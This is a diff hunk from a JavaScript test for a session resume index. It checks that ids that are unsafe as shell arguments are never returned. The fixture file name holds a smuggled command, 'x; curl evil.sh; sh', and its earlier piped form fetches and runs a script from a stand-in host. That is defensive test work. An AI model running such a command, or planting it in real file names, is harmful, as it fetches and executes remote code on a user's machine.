@@ -93,7 +93,8 @@ test('newest holder wins, the caller is excluded, and an unsafe id is never retu
   const now = Math.floor(Date.now() / 1000);
   write(proj, 10, `${rec('writer', sid(10))}\n`, now - 7200);
   write(proj, 11, `${rec('writer', sid(11))}\n`, now - 60);
-  const evil = path.join(proj, 'x; curl evil.sh | sh .jsonl');
+  /* No `|` — Windows forbids it in a file name, and the id is unsafe without it (spaces, `;`). */
+  const evil = path.join(proj, 'x; curl evil.sh; sh .jsonl');
   fs.writeFileSync(evil, `${rec('writer', 'x')}\n`);
   const ix = new ResumeIndex(base, index);
   assert.equal(await ix.lookup('writer'), sid(11));
